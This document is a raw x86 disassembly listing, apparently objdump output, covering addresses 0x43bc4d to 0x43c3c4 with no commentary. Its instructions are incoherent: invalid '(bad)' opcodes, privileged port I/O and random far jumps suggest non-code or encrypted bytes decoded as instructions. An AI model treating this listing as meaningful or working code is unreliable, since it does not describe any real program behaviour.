  43bc4d:	add    dl,BYTE PTR [edx-0x72]
  43bc50:	hlt    
  43bc51:	jp     0x43bcb7
  43bc53:	out    dx,al
  43bc54:	sbb    edi,eax
  43bc56:	pusha  
  43bc57:	pop    es
  43bc58:	mov    esi,0x1a0d6516
  43bc5d:	js     0x43bc57
  43bc5f:	aad    0x8c
  43bc61:	push   ecx
  43bc62:	sub    eax,0x976056a4
  43bc67:	scas   eax,DWORD PTR es:[edi]
  43bc68:	jl     0x43bbf0
  43bc6a:	pusha  
  43bc6b:	test   DWORD PTR [edi],ecx
  43bc6d:	arpl   WORD PTR [esi-0x3c719508],bp
  43bc73:	aam    0x0
  43bc75:	adc    ebx,DWORD PTR [ebx]
  43bc77:	and    WORD PTR [edx],cx
  43bc7a:	mov    dh,0x20
  43bc7c:	repz fst DWORD PTR [eax-0x48]
  43bc80:	inc    esp
  43bc81:	(bad)  
  43bc82:	mov    ds:0x51b20ed5,eax
  43bc87:	ins    DWORD PTR es:[edi],dx
  43bc88:	dec    edx
  43bc89:	add    DWORD PTR [esi-0x199c9cf5],ebp
  43bc8f:	daa    
  43bc90:	mov    ch,0xb4
  43bc92:	xor    BYTE PTR [ebp-0x74e0bf2c],dh
  43bc98:	xchg   al,bl
  43bc9a:	fsub   st(0),st
  43bc9c:	sbb    al,0xd4
  43bc9e:	clc    
  43bc9f:	aad    0xa3
  43bca1:	aas    
  43bca2:	sahf   
  43bca3:	sbb    al,0xe1
  43bca5:	pop    esp
  43bca6:	std    
  43bca7:	dec    esp
  43bca8:	sbb    BYTE PTR [eax+0x5a9dd712],bl
  43bcae:	lods   al,BYTE PTR ds:[esi]
  43bcaf:	fisubr DWORD PTR [eiz*2+0x617cd407]
  43bcb6:	(bad)  
  43bcb8:	adc    BYTE PTR [ecx-0x35],0x1b
  43bcbc:	(bad)  
  43bcbd:	int    0xff
  43bcbf:	mov    ds:0x48098f4,eax
  43bcc4:	cld    
  43bcc5:	xor    ch,al
  43bcc7:	inc    esp
  43bcc8:	pusha  
  43bcc9:	cmc    
  43bcca:	ins    DWORD PTR es:[edi],dx
  43bccb:	stos   DWORD PTR es:[edi],eax
  43bccc:	and    eax,0xbd0ca460
  43bcd1:	in     eax,0x4d
  43bcd3:	shr    BYTE PTR [ebx-0x52],1
  43bcd6:	pusha  
  43bcd7:	sub    DWORD PTR [ebx+ecx*1-0x52479094],esi
  43bcde:	jmp    0x43bc92
  43bce0:	mov    ah,0xb2
  43bce2:	push   edx
  43bce3:	loopne 0x43bc8a
  43bce5:	fstp   DWORD PTR [edi]
  43bce7:	add    edi,DWORD PTR [esi-0xc47f4db]
  43bced:	add    bh,BYTE PTR [eax+ecx*1+0x2e]
  43bcf1:	adc    bl,bh
  43bcf3:	mov    bl,0x65
  43bcf5:	dec    ebp
  43bcf6:	gs ins DWORD PTR es:[edi],dx
  43bcf8:	add    eax,0x215baeef
  43bcfd:	xor    edi,DWORD PTR [edi-0x52]
  43bd00:	mov    edx,0xdcfa5c02
  43bd05:	xchg   ecx,eax
  43bd06:	stos   BYTE PTR es:[edi],al
  43bd07:	rep lods eax,DWORD PTR ds:[esi]
  43bd09:	mov    eax,ds:0xbd35e11f
  43bd0e:	push   ss
  43bd0f:	lock sbb bh,BYTE PTR [ebp+0xe]
  43bd13:	xlat   BYTE PTR ds:[ebx]
  43bd14:	repnz push esp
  43bd16:	mov    eax,0x3e4614ae
  43bd1b:	and    al,0x6e
  43bd1d:	inc    esp
  43bd1e:	push   ds
  43bd1f:	loope  0x43bd02
  43bd21:	repnz cmp esi,DWORD PTR ds:0xb847cca6
  43bd28:	add    DWORD PTR [edi-0x2a305dd9],esi
  43bd2e:	dec    ebx
  43bd2f:	sbb    al,ch
  43bd31:	jbe    0x43bdaa
  43bd33:	mov    ebp,DWORD PTR es:[ecx]
  43bd36:	sub    BYTE PTR ds:0x43d1c814,dl
  43bd3c:	dec    eax
  43bd3d:	loopne 0x43bccb
  43bd3f:	xlat   BYTE PTR ds:[ebx]
  43bd40:	pop    ebx
  43bd41:	lock xchg edx,eax
  43bd43:	cmc    
  43bd44:	sub    al,BYTE PTR [ebp+0x2e]
  43bd47:	out    0xd9,eax
  43bd49:	pop    edi
  43bd4a:	sbb    BYTE PTR [eax],cl
  43bd4c:	mov    DWORD PTR [edi+0x3e7fb690],edx
  43bd52:	push   0x3c
  43bd54:	loopne 0x43bd58
  43bd56:	push   esp
  43bd57:	jo     0x43bd8d
  43bd59:	add    BYTE PTR ds:0x1e63ff09,dl
  43bd5f:	adc    DWORD PTR [ebx+0x3b],edi
  43bd62:	cli    
  43bd63:	jne    0x43bd27
  43bd65:	retf   0xd49b
  43bd68:	test   DWORD PTR [eax-0x6fd96f8c],0x4f87ea5f
  43bd72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bd73:	clc    
  43bd74:	mov    edi,0x16751f66
  43bd79:	or     BYTE PTR [edx+0x62860ed4],bh
  43bd7f:	adc    eax,0xfe714079
  43bd84:	mov    eax,0xbdf15adc
  43bd89:	jno    0x43bd29
  43bd8b:	sub    DWORD PTR [ebp+0x32eabd6a],0xfffffffa
  43bd92:	xlat   BYTE PTR ds:[ebx]
  43bd94:	add    ecx,eax
  43bd96:	cmc    
  43bd97:	cmp    al,0xd5
  43bd99:	scas   al,BYTE PTR es:[edi]
  43bd9a:	mov    ch,0x57
  43bd9c:	xchg   DWORD PTR [ebx+0x77],edi
  43bd9f:	mov    edi,0xf27f39a0
  43bda4:	sar    BYTE PTR [ebx+eiz*1],cl
  43bda7:	aam    0x36
  43bda9:	in     al,dx
  43bdaa:	pushf  
  43bdab:	xor    BYTE PTR [ecx-0x4ea5d0aa],dl
  43bdb1:	mov    bh,0x4b
  43bdb3:	jnp    0x43bdbd
  43bdb5:	and    DWORD PTR ds:0xeaeaa4b6,ebx
  43bdbb:	xlat   BYTE PTR ds:[ebx]
  43bdbc:	xchg   esp,eax
  43bdbd:	xchg   esi,eax
  43bdbe:	and    DWORD PTR [ebx],ebx
  43bdc0:	(bad)  
  43bdc1:	push   ds
  43bdc2:	sbb    edi,ecx
  43bdc4:	retf   
  43bdc5:	or     eax,0xdc7394a2
  43bdca:	pusha  
  43bdcb:	repz mov eax,ds:0x22c858e0
  43bdd1:	jb     0x43be42
  43bdd3:	in     al,dx
  43bdd4:	into   
  43bdd5:	add    eax,0x556ed870
  43bdda:	(bad)  
  43bddb:	dec    DWORD PTR [ebx]
  43bddd:	pop    ds
  43bdde:	inc    ebx
  43bddf:	(bad)  
  43bde1:	daa    
  43bde2:	push   ds
  43bde3:	icebp  
  43bde4:	cmpps  xmm7,XMMWORD PTR [edi-0x5e],0x19
  43bde9:	add    ah,BYTE PTR [eax-0x99c7f9a]
  43bdef:	jo     0x43be4d
  43bdf1:	cmc    
  43bdf2:	jge    0x43be6f
  43bdf4:	fld    DWORD PTR [ebx-0x5f5168c1]
  43bdfa:	out    0x1f,eax
  43bdfc:	jnp    0x43be00
  43bdfe:	adc    al,0x8
  43be00:	retf   
  43be01:	rcr    DWORD PTR [eax+0x60e83c6e],0x21
  43be08:	fcom   DWORD PTR [esi-0x4a74c992]
  43be0e:	pop    ecx
  43be0f:	cmp    eax,0x191e3d26
  43be14:	mov    bh,0x28
  43be16:	in     al,0x48
  43be18:	jo     0x43bde3
  43be1a:	pop    ds
  43be1b:	outs   dx,DWORD PTR ds:[esi]
  43be1c:	and    ebx,ebp
  43be1e:	enter  0x679,0x8b
  43be22:	ret    0x10d5
  43be25:	inc    edx
  43be26:	fimul  WORD PTR [edi]
  43be28:	mov    ah,0x9b
  43be2a:	fcom   DWORD PTR [edi+0x689e7589]
  43be30:	ds pop esp
  43be32:	sbb    BYTE PTR [bx+si+0x3],dl
  43be36:	mov    ds:0x40aed6a4,al
  43be3b:	jo     0x43bdc1
  43be3d:	cmp    eax,0x857a6162
  43be42:	and    ebp,edi
  43be44:	and    al,0xc9
  43be46:	gs xchg ebx,eax
  43be48:	aaa    
  43be49:	repz pusha 
  43be4b:	adc    BYTE PTR [edi-0x6e],0x60
  43be4f:	cmc    
  43be50:	inc    ebp
  43be51:	sub    al,0x79
  43be53:	call   0x775a:0xd4405a24
  43be5a:	sbb    dl,BYTE PTR [esi]
  43be5c:	jmp    0x43be07
  43be5e:	repz xor cl,BYTE PTR [edx+0x669a6711]
  43be65:	retf   0xf1a4
  43be68:	inc    eax
  43be69:	add    edi,DWORD PTR [ebx-0x654c8045]
  43be6f:	sahf   
  43be70:	mov    BYTE PTR [ecx+0x47da6752],al
  43be76:	jl     0x43be21
  43be78:	pop    ss
  43be79:	jmp    0x43be7d
  43be7b:	xchg   edi,eax
  43be7c:	cmp    al,0x5e
  43be7e:	push   ebx
  43be7f:	ror    DWORD PTR [edx+eax*1],cl
  43be82:	push   ss
  43be83:	jecxz  0x43be18
  43be85:	and    ebx,DWORD PTR [ecx+0x61ba7b96]
  43be8b:	xchg   ebp,eax
  43be8c:	stos   BYTE PTR es:[edi],al
  43be8d:	iret   
  43be8e:	pop    edi
  43be8f:	inc    edi
  43be90:	mov    ds:0x22e2c71d,al
  43be95:	ret    0xbb6c
  43be98:	jnp    0x43beb3
  43be9a:	adc    al,0xb9
  43be9c:	dec    ecx
  43be9d:	movq   mm5,mm4
  43bea0:	sbb    al,0x76
  43bea2:	mov    esi,0x96bbb160
  43bea7:	mov    eax,0x5284a388
  43beac:	mov    dl,0x4e
  43beae:	pop    edi
  43beaf:	aam    0x2f
  43beb1:	jmp    0xc2bd:0x2b11d4dd
  43beb8:	xchg   DWORD PTR [ebx],esp
  43beba:	test   eax,0x8452a849
  43bebf:	xor    ebp,DWORD PTR [ebx-0x7e]
  43bec2:	mov    eax,es
  43bec4:	out    dx,eax
  43bec5:	dec    eax
  43bec6:	adc    al,bh
  43bec8:	out    dx,eax
  43bec9:	test   ecx,esi
  43becb:	inc    ecx
  43becc:	push   ebx
  43becd:	pop    edx
  43bece:	lods   eax,DWORD PTR ds:[si]
  43bed0:	xchg   esp,eax
  43bed1:	push   ebp
  43bed2:	add    al,0xbb
  43bed4:	jecxz  0x43be9b
  43bed6:	mov    ah,0x2
  43bed8:	or     BYTE PTR [esi-0x6f],cl
  43bedb:	mov    ebx,0xce149242
  43bee0:	iret   
  43bee1:	dec    ecx
  43bee2:	adc    DWORD PTR [ecx+0x38],esi
  43bee5:	mov    bl,0xdd
  43bee7:	or     esi,eax
  43bee9:	xor    esp,DWORD PTR [edx-0x15ad83eb]
  43beef:	aam    0x6b
  43bef1:	pop    esi
  43bef2:	daa    
  43bef3:	(bad)  
  43bef4:	sbb    ch,dh
  43bef6:	dec    eax
  43bef7:	imul   edx,ebp,0xffffffc9
  43befa:	sbb    DWORD PTR [edx],0xffffff89
  43befd:	sub    edi,DWORD PTR [esi+0x4e]
  43bf00:	lods   al,BYTE PTR ds:[esi]
  43bf01:	cmp    DWORD PTR [eax-0x2718c62c],edx
  43bf07:	mov    ds:0x16c74ad5,al
  43bf0c:	mov    BYTE PTR [ecx+0x6a],bh
  43bf0f:	lahf   
  43bf10:	stos   BYTE PTR es:[edi],al
  43bf11:	pop    ss
  43bf12:	jb     0x43bf13
  43bf14:	push   ecx
  43bf15:	push   ds
  43bf16:	mov    eax,0x2ac7ce08
  43bf1b:	pushf  
  43bf1c:	dec    ecx
  43bf1d:	xchg   edi,eax
  43bf1e:	jno    0x43bead
  43bf20:	mov    DWORD PTR [ecx],esp
  43bf22:	lods   eax,DWORD PTR ds:[esi]
  43bf23:	icebp  
  43bf24:	mov    ds:0x20390ad5,eax
  43bf29:	inc    ebp
  43bf2a:	aas    
  43bf2b:	push   ecx
  43bf2c:	mov    BYTE PTR [ebx],ah
  43bf2e:	je     0x43bf35
  43bf30:	and    dl,BYTE PTR [ebp-0x67]
  43bf33:	push   esi
  43bf34:	ret    
  43bf35:	daa    
  43bf36:	(bad)  
  43bf37:	pop    ebx
  43bf38:	lock bound ebx,QWORD PTR [edi]
  43bf3b:	adc    cl,dh
  43bf3d:	cli    
  43bf3e:	out    dx,eax
  43bf3f:	pop    ebx
  43bf40:	fs inc esp
  43bf42:	daa    
  43bf43:	ret    
  43bf44:	jne    0x43bfc3
  43bf46:	push   ds
  43bf47:	inc    ecx
  43bf48:	in     al,0x1f
  43bf4a:	(bad)  
  43bf4b:	stos   BYTE PTR es:[edi],al
  43bf4c:	xchg   esp,eax
  43bf4d:	pushf  
  43bf4e:	mov    edi,0xb34efd8d
  43bf53:	mov    ebp,0x6fff738e
  43bf58:	(bad)  
  43bf59:	ror    BYTE PTR [edi+0x1e039858],cl
  43bf5f:	sub    edx,edi
  43bf61:	mov    esp,0x497af155
  43bf66:	add    BYTE PTR [ebp-0x4bf7d61],dh
  43bf6c:	or     edx,edx
  43bf6e:	call   0x9c85d304
  43bf73:	xchg   esi,eax
  43bf74:	pop    DWORD PTR [edi]
  43bf76:	lock lods al,BYTE PTR ds:[esi]
  43bf78:	push   ss
  43bf79:	and    al,0x88
  43bf7b:	cmc    
  43bf7c:	test   al,0xfc
  43bf7e:	call   0xbdf62f57
  43bf83:	jbe    0x43bf24
  43bf85:	add    esp,DWORD PTR [edi-0x227603aa]
  43bf8b:	aad    0xd8
  43bf8d:	jmp    0x5b6d:0x29b5dfeb
  43bf94:	inc    esp
  43bf95:	sbb    DWORD PTR [edi],ebx
  43bf97:	mov    esp,0x3b429ce6
  43bf9c:	aad    0x54
  43bf9e:	push   ds
  43bf9f:	or     esp,esp
  43bfa1:	dec    esp
  43bfa2:	or     edx,DWORD PTR [ebp+0x30]
  43bfa5:	cwde   
  43bfa6:	mov    eax,ds:0xfcb24fd5
  43bfab:	aad    0xea
  43bfad:	in     eax,0x86
  43bfaf:	mov    ecx,DWORD PTR [ecx-0x695826c9]
  43bfb5:	(bad)  
  43bfb6:	cmp    eax,0x32192ecb
  43bfbb:	jae    0x43bfeb
  43bfbd:	xchg   esi,eax
  43bfbe:	sbb    esp,edx
  43bfc0:	and    ah,BYTE PTR [ecx-0x35e49d57]
  43bfc6:	cdq    
  43bfc7:	neg    eax
  43bfc9:	push   ebp
  43bfca:	cmp    edx,DWORD PTR [esi]
  43bfcc:	mov    ecx,0x7acf1e52
  43bfd1:	cmp    dl,cl
  43bfd3:	fdiv   DWORD PTR [edx-0x5d]
  43bfd6:	mov    ebx,0x57dee6d4
  43bfdb:	mov    ebx,0x32ff85a7
  43bfe0:	xchg   DWORD PTR [ebx],edi
  43bfe2:	jg     0x43bf9b
  43bfe4:	in     al,0x63
  43bfe6:	jle    0x43c00f
  43bfe8:	mov    ebx,0x55f2d1c2
  43bfed:	test   BYTE PTR [ebx+0x1f4f8903],dh
  43bff3:	push   0x5890edad
  43bff8:	mov    ch,cl
  43bffa:	jno    0x43bfea
  43bffc:	push   esi
  43bffd:	adc    ebp,DWORD PTR [ebx-0x7d]
  43c000:	push   esp
  43c001:	repnz scas al,BYTE PTR es:[edi]
  43c003:	mov    eax,0xb6422a5a
  43c008:	or     ah,dh
  43c00a:	loopne 0x43c03c
  43c00c:	mov    ebx,0x4d5b1fdc
  43c011:	fsub   DWORD PTR [edx-0x53]
  43c014:	jne    0x43bfdf
  43c016:	sbb    dh,BYTE PTR [esi+edi*2-0x2a022bfd]
  43c01d:	push   es
  43c01e:	add    eax,0x6ad2a530
  43c023:	push   ebp
  43c024:	test   BYTE PTR [edx],dh
  43c026:	into   
  43c027:	sub    eax,0xab2e188
  43c02c:	sbb    al,0x3d
  43c02e:	cli    
  43c02f:	aad    0x68
  43c031:	(bad)  
  43c032:	mov    eax,ds:0x25226f29
  43c037:	mov    ch,BYTE PTR [ecx-0x1e]
  43c03a:	pusha  
  43c03b:	popf   
  43c03c:	arpl   di,bp
  43c03e:	jg     0x43c0b3
  43c040:	mov    esp,0x17d5a08f
  43c045:	mov    fs,WORD PTR [ebx+eiz*1]
  43c048:	cmp    eax,0x8e57ea93
  43c04d:	jmp    0xd3ea1eb5
  43c052:	jl     0x43c048
  43c054:	in     al,0x20
  43c056:	pop    eax
  43c057:	aam    0x9f
  43c059:	jp     0x43c0ab
  43c05b:	xor    al,0x72
  43c05d:	mov    ecx,0xf7d1cec3
  43c062:	outs   dx,BYTE PTR ds:[esi]
  43c063:	jecxz  0x43bfed
  43c065:	xor    DWORD PTR [esi+0x654ac4d7],edx
  43c06b:	aam    0xe4
  43c06d:	ins    DWORD PTR es:[edi],dx
  43c06e:	jg     0x43c02e
  43c070:	xchg   ecx,eax
  43c071:	add    BYTE PTR [ecx-0x78],dh
  43c074:	stc    
  43c075:	loope  0x43c078
  43c077:	aam    0x17
  43c079:	inc    edx
  43c07a:	sti    
  43c07b:	popf   
  43c07c:	pop    esi
  43c07d:	xor    ah,BYTE PTR [ebx-0x2c]
  43c080:	cmp    dl,dl
  43c082:	pop    ebx
  43c083:	inc    edi
  43c084:	stc    
  43c085:	popa   
  43c086:	call   0x29d7498e
  43c08b:	push   ss
  43c08c:	rol    DWORD PTR [ebx+0x26c6e9c],0xb0
  43c093:	xchg   DWORD PTR [edx-0x7ca02090],esp
  43c099:	mov    ds:0xc7cd7f1f,al
  43c09e:	retf   0x52c0
  43c0a1:	and    al,0xaa
  43c0a3:	stos   DWORD PTR es:[edi],eax
  43c0a4:	aaa    
  43c0a5:	sub    al,0x51
  43c0a7:	std    
  43c0a8:	adc    esp,DWORD PTR [edx-0x19]
  43c0ab:	or     eax,0x6b1f56f6
  43c0b0:	addr16 sbb al,0x17
  43c0b3:	mov    eax,0xe5e02774
  43c0b8:	fild   DWORD PTR [edx]
  43c0ba:	mov    esp,0x7121c4e1
  43c0bf:	cmp    al,0x92
  43c0c1:	(bad)  
  43c0c2:	sbb    ecx,DWORD PTR gs:[esi-0x20c6f8eb]
  43c0c9:	inc    edx
  43c0ca:	inc    ebp
  43c0cb:	mov    bl,0x58
  43c0cd:	bound  esp,QWORD PTR [edi]
  43c0cf:	mov    eax,ds:0xfb322147
  43c0d4:	mov    BYTE PTR [esi],bl
  43c0d6:	loope  0x43c05d
  43c0d8:	and    ah,dl
  43c0da:	pusha  
  43c0db:	and    ecx,ebp
  43c0dd:	inc    esp
  43c0de:	xor    al,0x10
  43c0e0:	int    0x39
  43c0e2:	add    al,0xf6
  43c0e4:	mov    esp,0x5ba7be00
  43c0e9:	pop    eax
  43c0ea:	ja     0x43c163
  43c0ec:	out    0x45,eax
  43c0ee:	xor    BYTE PTR [edx+0x571fe87b],cl
  43c0f4:	inc    eax
  43c0f5:	push   0x166b0b09
  43c0fa:	or     esi,esi
  43c0fc:	sbb    cl,BYTE PTR [ebx+0x28894ce3]
  43c102:	mov    ah,0x68
  43c104:	pop    ebp
  43c105:	mov    ds:0x8b7d4284,eax
  43c10a:	pop    ebp
  43c10b:	stos   DWORD PTR es:[edi],eax
  43c10c:	adc    cl,BYTE PTR [esi]
  43c10e:	loopne 0x43c124
  43c110:	aad    0xfe
  43c112:	aaa    
  43c113:	mov    eax,0xf1980378
  43c118:	out    dx,al
  43c119:	lock mov bl,0x5c
  43c11c:	fsub   st,st(6)
  43c11e:	inc    esp
  43c11f:	jmp    0x43c10b
  43c121:	popa   
  43c122:	jge    0x43c0b5
  43c124:	lods   al,BYTE PTR ds:[esi]
  43c125:	test   esp,edx
  43c127:	fld    DWORD PTR [eax]
  43c129:	push   0xcdd5f7
  43c12e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c12f:	cli    
  43c130:	inc    esi
  43c131:	dec    ebx
  43c132:	ret    
  43c133:	adc    DWORD PTR [ecx-0x15dc8d8b],ecx
  43c139:	ds inc esp
  43c13b:	mov    BYTE PTR [edx+0x10d770e6],cl
  43c141:	adc    bl,BYTE PTR [ebx+0x746ba04f]
  43c147:	sbb    eax,0xebd62768
  43c14c:	mov    ah,0x5
  43c14e:	sub    BYTE PTR [ebx],dh
  43c150:	pop    ebp
  43c151:	leave  
  43c152:	fldenv [eax+esi*1+0x24]
  43c156:	lods   al,BYTE PTR ds:[esi]
  43c157:	dec    eax
  43c158:	jmp    0x43c1b2
  43c15a:	arpl   WORD PTR [eax],di
  43c15c:	pusha  
  43c15d:	call   0xb221:0xe76dd6de
  43c164:	js     0x43c173
  43c166:	iret   
  43c167:	aam    0xca
  43c169:	iret   
  43c16a:	std    
  43c16b:	inc    ebp
  43c16c:	sbb    BYTE PTR [edi+0x41880185],ah
  43c172:	xchg   ebp,eax
  43c173:	hlt    
  43c174:	xchg   ecx,eax
  43c175:	arpl   cx,cx
  43c177:	in     eax,dx
  43c178:	push   eax
  43c179:	add    BYTE PTR [edx-0x53],al
  43c17c:	cmp    eax,DWORD PTR [ebp+0x3]
  43c17f:	lea    edx,[ebx-0x61374d13]
  43c185:	sbb    edi,edi
  43c187:	push   esi
  43c188:	loop   0x43c18c
  43c18a:	(bad)  
  43c18b:	mov    ch,0xaa
  43c18d:	aad    0x68
  43c18f:	aam    0x56
  43c191:	scas   eax,DWORD PTR es:[edi]
  43c192:	popa   
  43c193:	mov    ebp,0xb297da55
  43c198:	mov    BYTE PTR ds:0x16211e2e,dh
  43c19e:	clc    
  43c19f:	out    0xad,eax
  43c1a1:	inc    esi
  43c1a2:	add    al,0x18
  43c1a4:	out    dx,eax
  43c1a5:	test   ebp,eax
  43c1a7:	mov    edi,0xbf80a03a
  43c1ac:	mov    ebp,esp
  43c1ae:	adc    al,0x29
  43c1b0:	cwde   
  43c1b1:	das    
  43c1b2:	or     eax,0xde02c062
  43c1b7:	stos   BYTE PTR es:[edi],al
  43c1b8:	ins    BYTE PTR es:[edi],dx
  43c1b9:	mov    ch,0xff
  43c1bb:	mov    eax,0xfb60d25a
  43c1c0:	or     eax,0x61789ba5
  43c1c5:	shl    DWORD PTR [ebp+0x15],0x66
  43c1c9:	push   ds
  43c1ca:	test   BYTE PTR [edi+0x12],bh
  43c1cd:	cli    
  43c1ce:	pop    ds
  43c1cf:	sub    DWORD PTR [esi+0x3b8a51bc],ecx
  43c1d5:	lea    ebx,[eax-0xf]
  43c1d8:	lods   al,BYTE PTR ds:[esi]
  43c1d9:	add    ah,dh
  43c1db:	dec    eax
  43c1dc:	leave  
  43c1dd:	mov    eax,ds:0x9909d47e
  43c1e2:	push   es
  43c1e3:	out    0x89,al
  43c1e5:	ret    
  43c1e6:	fdiv   QWORD PTR [ecx]
  43c1e8:	call   0xab61ef87
  43c1ed:	adc    al,0x6a
  43c1ef:	mov    dl,ch
  43c1f1:	sbb    al,dl
  43c1f3:	mov    ah,0x0
  43c1f5:	cmp    edx,DWORD PTR [edx-0x3b]
  43c1f8:	xchg   esi,eax
  43c1f9:	ja     0x43c253
  43c1fb:	hlt    
  43c1fc:	or     al,0x9b
  43c1fe:	push   ds
  43c1ff:	pop    ss
  43c200:	mov    DWORD PTR [edx+0x5d9ccec],eax
  43c206:	jle    0x43c265
  43c208:	and    ecx,ecx
  43c20a:	stos   DWORD PTR es:[edi],eax
  43c20b:	(bad)  
  43c20c:	jmp    0x43c26f
  43c20e:	jp     0x43c24b
  43c210:	ins    BYTE PTR es:[edi],dx
  43c211:	into   
  43c212:	adc    DWORD PTR [edi],edx
  43c214:	and    eax,0x6b57c3d4
  43c219:	add    ch,BYTE PTR [ebx+edi*4+0x34]
  43c21d:	in     eax,0xbe
  43c21f:	mov    bp,WORD PTR [ebx]
  43c222:	jp     0x43c1bd
  43c224:	adc    ecx,DWORD PTR [ebx+0x48]
  43c227:	adc    al,0x5
  43c229:	shl    bh,0x9f
  43c22c:	jo     0x43c230
  43c22e:	and    dh,0x44
  43c231:	shl    bl,cl
  43c233:	in     al,dx
  43c234:	mov    esi,0x5ceb7e0e
  43c239:	push   es
  43c23a:	jno    0x43c1d1
  43c23c:	adc    eax,0x14bee1c5
  43c241:	ret    0xd6d8
  43c244:	ins    DWORD PTR es:[edi],dx
  43c245:	ins    DWORD PTR es:[edi],dx
  43c246:	jl     0x43c1fe
  43c248:	(bad)  
  43c249:	pop    eax
  43c24a:	cmp    dh,BYTE PTR [esi+ebx*1]
  43c24d:	dec    ebp
  43c24e:	push   ds
  43c24f:	shr    DWORD PTR [edi],cl
  43c251:	jmp    0x53541c48
  43c256:	inc    ebp
  43c257:	aad    0x6e
  43c259:	xor    al,0xc2
  43c25b:	inc    ecx
  43c25c:	inc    esp
  43c25d:	sar    DWORD PTR [edx-0x20e476db],1
  43c263:	shl    ch,cl
  43c265:	jmp    0xa20:0x20ff63b
  43c26c:	scas   eax,DWORD PTR es:[edi]
  43c26d:	call   0xa960:0xe01b881f
  43c274:	pop    eax
  43c275:	xor    BYTE PTR [ebx-0x409a8fc9],0xff
  43c27c:	pusha  
  43c27d:	adc    edi,esp
  43c27f:	mov    bl,0x64
  43c281:	loop   0x43c262
  43c283:	aam    0xf7
  43c285:	iret   
  43c286:	xchg   esp,eax
  43c287:	xchg   edx,eax
  43c288:	inc    ebx
  43c289:	jo     0x43c2e8
  43c28b:	jae    0x43c2b7
  43c28d:	sbb    DWORD PTR [edi+0x420448e9],ebx
  43c293:	sahf   
  43c294:	jno    0x43c298
  43c296:	mov    ?,WORD PTR [eax]
  43c298:	test   al,0xa2
  43c29a:	dec    edi
  43c29b:	cmc    
  43c29c:	mov    ds:0x745d6dbb,al
  43c2a1:	xchg   ecx,eax
  43c2a2:	jge    0x43c290
  43c2a4:	or     DWORD PTR [eax-0x65],ebp
  43c2a7:	pushw  0x3
  43c2aa:	les    esp,FWORD PTR [esi-0x69ee7837]
  43c2b0:	jmp    0xfa33:0xac0206a5
  43c2b7:	ficom  DWORD PTR [edi+edx*1-0x7732a04]
  43c2be:	test   DWORD PTR [eax-0x7b],edi
  43c2c1:	mov    ch,0x13
  43c2c3:	jle    0x43c24d
  43c2c5:	rol    DWORD PTR [edi+ecx*1-0x38],cl
  43c2c9:	hlt    
  43c2ca:	pop    es
  43c2cb:	mov    dh,0x89
  43c2cd:	adc    DWORD PTR [ecx-0x6e],0x1c81ed46
  43c2d4:	mov    dh,bl
  43c2d6:	adc    bh,dl
  43c2d8:	pop    edx
  43c2d9:	xor    ah,BYTE PTR [ebx]
  43c2db:	adc    DWORD PTR [ebx-0x6b],eax
  43c2de:	pop    esp
  43c2df:	inc    edi
  43c2e0:	mov    BYTE PTR [edi],dl
  43c2e2:	les    esi,FWORD PTR [ebx+0x27]
  43c2e5:	and    DWORD PTR [edi+0x62],0x6a
  43c2e9:	add    bh,BYTE PTR [edx]
  43c2eb:	or     ch,al
  43c2ed:	outs   dx,BYTE PTR ds:[esi]
  43c2ee:	and    esi,DWORD PTR es:[ebp+0xa9b1ff4]
  43c2f5:	cwde   
  43c2f6:	cmc    
  43c2f7:	scas   eax,DWORD PTR es:[edi]
  43c2f8:	cld    
  43c2f9:	pop    ebx
  43c2fa:	ss aam 0x58
  43c2fd:	xchg   esi,eax
  43c2fe:	push   0xfa21a3f3
  43c303:	(bad)  
  43c304:	je     0x43c304
  43c306:	outs   dx,BYTE PTR ds:[esi]
  43c307:	xchg   DWORD PTR [eax-0x62],ecx
  43c30a:	mov    bh,0xe2
  43c30c:	sub    BYTE PTR [esi+0x2694c14],bh
  43c312:	lock pop esp
  43c314:	add    al,0x89
  43c316:	jle    0x43c370
  43c318:	in     al,0x2
  43c31a:	pop    ds
  43c31b:	xchg   ebx,eax
  43c31c:	repz adc eax,0x341e0273
  43c322:	loopne 0x43c2f8
  43c324:	mov    dh,0x97
  43c326:	cmp    eax,0x9e323112
  43c32b:	mov    cl,BYTE PTR [eax+0x2d6f4a6d]
  43c331:	shr    BYTE PTR [esi-0x53fa7081],cl
  43c337:	push   0xdfb58bb4
  43c33c:	jns    0x43c36e
  43c33e:	sbb    dh,al
  43c340:	mov    BYTE PTR [edi],dh
  43c342:	mov    ecx,DWORD PTR [ebp-0x32]
  43c345:	inc    ebp
  43c346:	shl    cl,cl
  43c348:	jmp    0x43c34f
  43c34a:	push   0xffffffa7
  43c34c:	sar    DWORD PTR [esi-0x6d],0x6a
  43c350:	ud2    
  43c352:	pusha  
  43c353:	or     eax,0x4b6121a4
  43c358:	push   0x36d20ea9
  43c35d:	add    ah,ch
  43c35f:	sub    edi,DWORD PTR [ebp+0x6a1c4e40]
  43c365:	(bad)  
  43c366:	popa   
  43c367:	xchg   ebx,eax
  43c368:	push   0x2a
  43c36a:	jge    0x43c3a7
  43c36c:	pop    ebp
  43c36d:	lods   al,BYTE PTR ds:[esi]
  43c36e:	pcmpgtw mm7,QWORD PTR [esi]
  43c371:	lea    esi,[edi]
  43c373:	xor    ecx,DWORD PTR [eax-0x5940a939]
  43c379:	and    bh,ah
  43c37b:	mov    esp,0xc5a90988
  43c380:	jle    0x43c3b4
  43c382:	or     DWORD PTR [edi+0x418b8b97],eax
  43c388:	mov    cs,edx
  43c38a:	call   0x91209f8e
  43c38f:	pushf  
  43c390:	sub    dh,BYTE PTR ds:0x8642831f
  43c396:	add    ebp,DWORD PTR [edi+ebx*8+0x70409408]
  43c39d:	shl    BYTE PTR [eax-0x27],1
  43c3a0:	ins    BYTE PTR es:[edi],dx
  43c3a1:	imul   esi,DWORD PTR [ecx-0x51],0x5e
  43c3a5:	xchg   ebx,eax
  43c3a6:	(bad)  
  43c3a7:	leave  
  43c3a8:	push   esp
  43c3a9:	cwde   
  43c3aa:	scas   al,BYTE PTR es:[edi]
  43c3ab:	and    edx,DWORD PTR [ebp+0x151c9f8c]
  43c3b1:	add    ebp,DWORD PTR [esi-0x46675620]
  43c3b7:	hlt    
  43c3b8:	push   ebx
  43c3b9:	pop    esi
  43c3ba:	pop    ds
  43c3bb:	sub    eax,DWORD PTR [edx+0x6c]
  43c3be:	or     DWORD PTR [ebp-0x34],eax
  43c3c1:	lods   eax,DWORD PTR ds:[esi]
  43c3c2:	add    al,0xad
  43c3c4:	push   es
